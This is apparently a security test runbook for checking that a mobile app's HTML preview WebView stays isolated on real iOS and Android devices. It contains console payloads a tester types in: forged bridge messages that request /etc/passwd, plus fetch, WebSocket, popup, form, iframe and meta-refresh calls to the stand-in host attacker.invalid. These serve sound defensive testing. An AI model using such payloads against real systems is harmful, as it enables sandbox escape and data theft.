# HTML preview native isolation validation

This is a physical-device/simulator gate. The browser test in
`test-html-preview.mjs` does not satisfy it. Run these checks on every iOS and
Android platform enabled for rollout, after the normal P2 file-tab route renders
`HtmlPreviewRenderer`. Do not add an `onMessage` handler or a privileged test
bridge to collect results.

## Prepare the document

Copy the committed hostile document outside the repository so the production
file-open path reads it like any other user file:

```sh
cp app/src/surfaces/html-preview/__fixtures__/interactive-hostile.html \
  /tmp/remux-html-preview-native.html
```

Run the app through its ordinary Expo development build on the target device,
connect it to a disposable Remux host, and open the copied file from Files. This
uses the production parser, file loader, tab controller, and renderer. A screen
that imports the fixture as a string is insufficient because it bypasses that
path. Record the app build/update ID, OS version, device or simulator model, and
WebView version with the result.

The checked-in availability gate is closed. In a disposable validation checkout,
add only the platform under test to `verifiedPlatforms` in
`htmlPreviewAvailability.ts`, then build the development app. This temporary
change is for the proof run, not a production enablement; do not publish it to
the production channel or commit it as accepted evidence before the checks pass.
After validation, remove the temporary change. A reviewed enablement commit must
record the actual device results before adding a platform to the release gate.

## Observe prohibited traffic

Route the device through a fresh intercepting proxy whose request log is empty
before the test. Clear only the proxy log; do not clear app or shared WebView
cookies. Filter for `attacker.invalid`, `example.com`, `file:` and WebSocket
connections.

Open the preview and wait five seconds. The log must contain no fetch, WebSocket,
image, frame, script, refresh, or other request caused by the document. Click the
external and sibling links inside the document; the preview must remain on the
same document and must not open a browser. The same links may appear in the
native Links control, where the user can explicitly open them.

Using Safari Web Inspector on iOS or Chrome remote debugging on Android, run each
expression in the report frame:

```js
typeof window.ReactNativeWebView
window.ReactNativeWebView?.postMessage('{"type":"remux/request","id":1,"method":"host/file/open","params":{"path":"/etc/passwd"}}')
window.parent.postMessage({type: 'remux/request', method: 'host/file/open'}, '*')
fetch('https://attacker.invalid/manual-fetch')
new WebSocket('wss://attacker.invalid/manual-socket')
window.open('https://attacker.invalid/popup')
location.href = 'https://attacker.invalid/location'
```

The first expression must return `"undefined"`. The others must produce zero
host RPC actions, external windows, navigation, or network requests. Inspect the
host log and selected tab after the forged messages; absence of a JavaScript
exception alone is not evidence.

Create and submit a form and nested frame from the same console:

```js
const form = document.body.appendChild(document.createElement('form'));
form.action = 'https://attacker.invalid/form'; form.method = 'post'; form.submit();
const frame = document.body.appendChild(document.createElement('iframe'));
frame.src = 'https://attacker.invalid/nested-frame';
```

Both must remain blocked. A dynamically inserted meta refresh must also remain
blocked by native navigation policy:

```js
const refresh = document.head.appendChild(document.createElement('meta'));
refresh.httpEquiv = 'refresh'; refresh.content = '0;url=https://attacker.invalid/dynamic-refresh';
```

Confirm that `document.location.origin` is `https://html-preview.invalid`, that
Remux cookies are absent from `document.cookie`, and that storage written at the
synthetic origin is not visible in an authenticated Agent/extension WebView.
Do not clear shared cookies as part of this check.

## Confirm supported behavior and recovery

Move the Reveal slider to 75 and confirm the value becomes visible. Click the
Details fragment link and confirm the hash changes without a document reload.
Repeat at phone and desktop-sized viewport widths. Then terminate the WebView
content/render process using the platform debugger and confirm the app-owned
recoverable failure appears without an automatic reload loop.

Record each platform separately as pass, fail, or unavailable. Interactive
Preview must stay unavailable on a platform until that platform passes. Keep the
browser-policy result and source inspection as supporting evidence rather than
labeling them native isolation proof.
